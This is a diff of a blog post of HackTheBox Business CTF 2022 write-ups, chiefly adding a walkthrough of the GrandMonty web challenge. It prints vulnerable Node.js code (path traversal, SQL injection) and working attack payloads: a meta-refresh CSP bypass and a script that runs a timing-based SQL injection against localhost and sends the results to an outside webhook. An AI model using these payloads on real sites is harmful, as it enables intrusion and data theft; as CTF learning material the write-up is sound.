@@ -1,13 +1,15 @@
 ---
 layout: post
 title:  "HackTheBox Business CTF 2022 Writeups"
-date:   2022-07-18 07:55:19 -0400
-categories: ctf
+tags: ctf htb
 ---
+* TOC
+{:toc}
 
 ## Introduction
 
 Last weekend, I participated in [HackTheBox's Business CTF](https://www.hackthebox.com/events/htb-business-ctf-2022), which was really fun. I generally find the more hardcore CTFs are too menacing for general consumption (looking at you DEFCON, why so many reversing challenges), and HTB actually does a great job balancing the difficulty and fun of the challenges. In the spirit of being more consistent in my blogging and writing, I have decided to write some writeups for the challenges I worked on for this competition. This writeup is more verbose than your usual writeups in order to aid understanding, so be warned!
+
 
 ### \[Pwn\] Superfast (unsolved) - (18 Solves)
 
@@ -366,10 +368,6 @@ if __name__ == '__main__':
     main()
 ```
 
----
-
-More writeups are due, the below isn't complete and are just solve script/brain dumps, stay tuned for the full writeup!
-
 ### \[Reversing\] Mr. Abilgate - (27 Solves)
 
 A teammate of mine identified it was UPX packed, so I continued from there. If you tried unpacking it, the binary becomes broken (you can run it in a debugger and you would realize some addresses are not translated properly and results in a `EXCEPTION_ACCESS_VIOLATION` in some address starting at `0x14...`). Here's an example of an error you might face in the unpacked binary.
@@ -516,7 +514,7 @@ Archive:  ImportantAssets.xls
 
 ### \[Reversing\] Breakin (unsolved) - (20 Solves)
 
-This was a C++ reversing challenge which is a bit intimidating but the actual non-library code was pretty tiny and had debug symbols could be quickly reversed. Once you reverse `getSecret`, you find the secret admin page and the password query needed (Breakin's flag) to get to the secret admin page, where you can upload marshaled Python objects that would execute on the server (gleaned from `getExec`). Figuring out how the marshaled object should look like was a pain and it kept crashing and returning `<NULL>`. The first step is to pull all the libraries to run it locally to iterate faster, because one invalid input crashes the container **forever**. It was until I found [this article](https://awasu.com/weblog/embedding-python/calling-python-code-from-your-program/) detailing the steps to constructing it before I could construct a valid marshaled object for the service's consumption.
+This was a C++ reversing challenge which is a bit intimidating but the actual non-library code was pretty tiny and had debug symbols so it could be quickly reversed. Once you reverse `getSecret`, you find the secret admin page and the password query needed (Breakin's flag) to get to the secret admin page, where you can upload marshaled Python objects that would execute on the server (gleaned from `getExec`). Figuring out how the marshaled object should look like was a pain and it kept crashing and returning `<NULL>`. The first step is to pull all the libraries to run it locally to iterate faster, because one invalid input crashes the container **forever**. It was until I found [this article](https://awasu.com/weblog/embedding-python/calling-python-code-from-your-program/) detailing the steps to constructing it before I could construct a valid marshaled object for the service's consumption.
 
 I managed to get as far as the reverse shell before the competition ended, but unfortunately the reverse shell kept dying (likely due to a timeout). I reproduce the script I have so far. *Edit: it was not because of a timeout, the container just kept randomly dying without any warning.*
 
@@ -846,10 +844,224 @@ slack-url=slack&redirect-url=redirecturl&template-page=owagray&campaign=campaign
 
 ### \[Web\] GrandMonty - (8 Solves)
 
-Use meta-refresh to redirect to your site and bypass CSP, coerce the admin to `GET /graphql` to bypass CORS preflight, us ea timing side channel from the SQL injection to XS-leak out the flag.
+I worked on the challenge after a teammate leaked the source code of the challenge. Just to briefly explain:
+
+```js
+router.get('/files/:file', async (req, res) => {
+    const { file } = req.params;
+
+    return res.sendFile(path.join(__dirname, '/../uploads', file));
+});
+```
+
+Even if `path.join` is used, `file` which is user controlled can still contain directory traversal characters (e.g. `%2f..%2f..`) which can be used to load other files. A proper implementation of this has to filter out directory traversal characters or normalize the path to check if it is a valid directory. Of course, here, the source code was not provided, so kudos to my teammate for finding this bug and making the rest possible. In this case, we used this to leak out the `/app/index.js` and referred to that to further leak out other dependencies, as well as the `package.json` file. 
+
+With the whole source code leaked, let's have a good understanding of the problem. We first see find and see where the flag is located, and it tells us it's loaded into the database as one of the user's passwords:
+
+```sql
+INSERT INTO grandmonty.users (username, password) VALUES
+('burns', 'HTB{f4k3_fl4g_f0r_t3st1ng}');
+```
+
+The database runs on the same host as the web server, as shown below:
+
+```js
+constructor() {
+    this.connection = mysql.createConnection({
+        host: '127.0.0.1',
+        user: 'monty',
+        password: 'burns0x01',
+        database: 'grandmonty'
+    });
+}
+```
+
+We attempted to dump the tables of the mysql server since it's stored in `/var/lib/mysql/<table_name>`, but we get permission denied, so our little cheese failed. We need to dig deeper, and in the same `database.js` there is a trivial SQL injection.
+
+```js
+// For admin only
+
+async getRansomChat(enc_id) {
+    return new Promise(async (resolve, reject) => {
+        let stmt = `SELECT * FROM ransom_chat WHERE enc_id = '${enc_id}'`;
+        this.connection.query(stmt, (err, result) => {
+            if(err)
+                reject(err)
+            try {
+                resolve(JSON.parse(JSON.stringify(result)))
+            }
+            catch (e) {
+                reject(e)
+            }
+        })
+    });
+}
+```
+
+If the user controls `enc_id`, we can presumably perform SQL injection and leak out the flag! This was a really promising avenue of attack, unfortunately this is for admin on the localhost only, as evidenced below:
+
+```js
+const isLocal = req => ((req.ip == '127.0.0.1' && req.headers.host == '127.0.0.1:1337') ? true : false);
+...
+RansomChat: {
+    type: RansomChatType,
+    args: {
+        enc_id: {
+            type: new GraphQLNonNull(GraphQLString)
+        }
+    },
+    resolve: async (root, { enc_id }, request) => {
+        return new Promise((resolve, reject) => {
+            if (!isLocal(request)) return reject(new GraphQLError('Only localhost is allowed this query!'));
+            db.getRansomChat(enc_id)
+                .then(row => {
+                    resolve(row[0])
+                })
+                .catch(err => reject(new GraphQLError(err)));
+        });
+    }
+},
+```
+
+We are able to speak to the admin via the chat window at `/api/chat/send`. The pieces of the puzzle are coming together nicely now, and we are supposed to somehow either access the endpoint directly by stealing the admin's cookie or coerce the admin to exfiltrate the flag via the SQLi for us. There's completely no filtering done on our input before being rendered onto the page as well, so in the ideal scenario we just XSS and exfiltrate out the payload as per the previous client-side challenge. Unforuntately, the page utilizes a thorough CSP policy:
+
+```js
+// almighty bonk
+app.use(function (req, res, next) {
+    res.setHeader(
+        'Content-Security-Policy',
+        `default-src 'none'; script-src 'self'; style-src 'self' fonts.googleapis.com; font-src fonts.gstatic.com; img-src 'self'; form-action 'self'; base-uri 'none'; connect-src 'self';`
+    );
+    next();
+});
+```
+
+Looking at this in CSP evaluator:
+
+![](/images/htbbusiness2022/csp.png)
+
+The CSP seems to have a weakness if we host JSONP, Angular or user uploaded files! There's no JSONP or Angular things happening here, but there is an endpoint that takes in a user uploaded file
+
+```js
+router.post('/api/upload', PublicMiddleware, async (req, res) => {
+    if (!req.files || !req.files.imageFile)
+        return res.status(400).send(response('No files were uploaded.'));
+
+    imageFile = req.files.imageFile;
+
+    decFile = await DecryptorHelper.decrypt(req.user.enc_id, imageFile);
+
+    return res.json({decFile});
+
+});
+```
+
+We need the file to touch the filesystem, so either upon request or in the processing, if any part of it touches **any part** of the file system, we can utilize the LFI we saw earlier to include the JavaScript and get our XSS working. Unfortunately, the `decrypt` does absolutely nothing:
+
+```js
+const decrypt = async (encId, encFile) => {
+    // TODO
+
+    return "The file is not a valid encrypted file!"
+}
+```
+
+Further, `express-fileupload`, the library used, [by default does not store file uploads as files](https://github.com/richardgirges/express-fileupload#:~:text=than%20configured%20limits.-,useTempFiles,false%C2%A0(default),-true), and the configuration in the server doesn't utilize the `useTempFiles` temporary file option:
+
+```js
+app.use(fileUpload({ limits: {
+    fileSize: 1024 * 1024 // 1 MB
+},
+abortOnLimit: true
+}));
+```
+
+So we are stuck once again. At this point, I went to look for issues regarding `express-fileupload` and saw an interesting prototype pollution vulnerability, and with the limited amount of solves that it had I went on a wild goose chase to see if any part of `express-fileupload` touches disk on its default settings or if there was any CVEs reported for the version that was used. Unforuntately I didn't see anything exploitable in this context, though there were some interesting code that I might leverage on for my own challenge...
+
+It looks like finding an 0-day in `express-fileupload` wasn't the solution, it was here I thought of something creative. On the browser, we can be coerced to download files with the `Content-Disposition` header in the response, so I was convinced that it might be possible to redirect the administrator using the universal CSP bypass of  using the [meta refresh tag](https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass#meta-tag) and force the puppeteer browser to download a file on the local filesystem, and then we use the LFI trick described earlier to include that file in a `script src`. Now this seems very plausible and would have been a really good cheese for this challenge, so we started on working towards this vector of attack.
+
+One of the most vital things in solving this challenge was creating a local environment to test, because the bot takes **forever** to restart and with multiple teammates working on this problem, there was quite a bit of competition for who gets to use the bot. The bot restarts every 2 minutes, which means we only get to test our payloads every 2 minutes if we didn't set up our local environment.
+
+```js
+let token = await JWTHelper.sign({ username: 'admin' });
+await page.setCookie({
+    name: "admin_sess",
+    'value': token,
+    domain: "127.0.0.1:1337"
+});
+await page.goto(`http://127.0.0.1:1337/admin/messages/${enc_id}`, {
+    waitUntil: 'networkidle2',
+    timeout: 5000
+});
+await page.waitForTimeout(120000); // stay for 2 minutes
+await browser.close();
+await db.purgeRansomChat();
+```
+
+Setting up a mysql database in Docker for alpine is a little more painful than you can imagine, and is left as an exercise for the reader.
+
+After numerous tries, we couldn't figure out why puppeteer was throwing an error every time we tried to download a file. It turns out that [headless chrome browsers do not download files by default](https://bugs.chromium.org/p/chromium/issues/detail?id=696481), so this avenue is basically cut off.
+
+We thought about this deeper, and the SQLi is obvious so it **must** be part of the intended solution path. We don't have XSS on the website hosting the ransom messages, and it doesn't look like any other part of the website is vulnerable (and in any case, it would be protected by the CSP). However, we do have the ability to perform an arbitrary redirect using the `meta refresh` tag described earlier. However, since we have redirected to our own site (which is of a separate origin), if we do make a request to perform the SQL injection, we won't be able to read the response since the request made was cross-origin. However, I had an hypothesis that we could probably time how long the response would take to get back to us via a `SLEEP` based SQLi payload. So we started work on trying to make such a request work.  
+
+There are a few hoops to jump in order to even make such a request. First, if you try to make a request to `localhost` from any other origin that is not HTTPS, you will get this nasty message:
+
+```
+Access to fetch at 'http://127.0.0.1/' from origin 'http://example.com' has been blocked by CORS policy: The request client is not a secure context and the resource is in more-private address space `local`.
+```
+
+So the protections in Chrome prevent evil client side scripts from accessing localhost. That's generally a good thing, but not a good thing for us in this context because we can't make our request to the local server (recall the `isLocal` check), and at first I thought we were off track again because this seems impossible to bypass and I don't think we are 0-daying Chrome today, but carefully reading this, I wondered what a "secure" context was. It turns out, **if you made the request from https, this protection can be bypassed**, so to solve this, I spent USD$240 on an `ngrok` license so I could have HTTPS on my local setup much easier. You may choose to use GitHub Pages or S3 for more budget conscious CTF players.
+
+The next hoop to jump over are the preflighted request. Making a request to the server to perform the GraphQL queries (and in turn, the SQL query) unfortunately is a complex request [since the Content-Type is of `application/json`](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch#:~:text=Content%2DType%20with%20a%20value%20of%20application/x%2Dwww%2Dform%2Durlencoded%2C%20multipart/form%2Ddata%2C%20or%20text/plain)  which means a preflight would be sent and since no CORS headers are configured in the response from the server, the browser would refuse to make the actual request. We need to make the request a simple one, and looking through all endpoints they all required the body to be of type `application/json`, and changing the `Content-Type` header caused the processing of the body to fail. Finally after some digging, the `/graphql` endpoint stood out for me:
+
+```js
+router.use('/graphql', graphqlHTTP({
+    schema: GraphqlSchema,
+    graphiql: false
+}));
+```
+
+If there were alternate ways of querying (other than `POST /graphql` with `application/json`), then we would have what we need to make a simple fetch request. Thankfully, the [documentation of `express-graphql`](https://github.com/graphql/express-graphql#http-usage) saves the day:
+
+> GraphQL will first look for each parameter in the query string of a URL:
+> `/graphql?query=query+getUser($id:ID){user(id:$id){name}}&variables={"id":"4"}`
+
+This seems a bit odd that this is supported since the query is potentially state changing, but I ain't complaining. With this, we can simply include the query in the request parameters of the `GET /graphql`, and with no illegal headers or custom `Content-Type`, we satisfy the condition for making a simple fetch request!
+
+We are now finally ready to construct the payload. In summary, we use meta-refresh to redirect to your site and bypass CSP, coerce the admin to `GET /graphql` to bypass CORS preflight, use the timing side channel from the SQL injection to XS-leak out the flag.
+
+To first invoke the timing side channel, we use a simpler payload of just sleeping [(XS-leak payload from here)](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks):
+
+```html
+<html>
+    <body>
+        <script>
+        var start = performance.now()
+        fetch(`http://127.0.0.1:1337/graphql?query=query {RansomChat(enc_id:"1f81b076-fffc-45cd-b7c3-c686b73aa6af' AND sleep(5)%3d'1"){id}}`, 
+        {
+            mode: "no-cors"
+        }
+        ).then(() => {
+            var time = performance.now() - start;
+            fetch("https://webhook.site/6f47c639-ce29-4635-bcc9-c33ebf316fba?time=" +"The+request+took+%d+ms."+time);
+        }).catch((error) => {
+            fetch("https://webhook.site/6f47c639-ce29-4635-bcc9-c33ebf316fba?error=" + error);
+        })
+        </script>
+    </body>
+</html>
+```
 
 POC to send to admin:
+```html
+<meta http-equiv="refresh" content="0; url=https://64e41bcd2960.ap.ngrok.io/abc.html">
+```
 
+This works and we get our response back after 5 seconds on our webhook!
+
+We now modify the payload to loop through all guesses and all indices of the password, and only send back guesses which are correct to our webhook (i.e. after 4 seconds). Note that we aren't using `fetch` here anymore because it's asynchronous and I couldn't figure out how to make it synchronous. If multiple asynchronous `fetch` requests with `SLEEP` are made, because the `mysqld` is a single process, the `SLEEP` affects all other connections as well, thus influencing results, hence we need it to be synchronous to ease processing the results later. With the payload below, we get our flag!
+
+POC to send to admin:
 ```html
 <meta http-equiv="refresh" content="0; url=https://64e41bcd2960.ap.ngrok.io/abc.html">
 ```
@@ -884,10 +1096,12 @@ abc.html:
             }
         }
         </script>
-
-    
     </body>
 </html>
 ```
+
+This was quite enjoyable and was the first time I did an XS-leak, so a great learning opportunity here. Some interesting hoops to jump over as well, and upon reflecting some of these hoops really didn't make too much sense on why the security feature was implemented like this. 
+
+That's all the challenges I worked on, and I hope you found this writeup useful.
 
 Hack on!
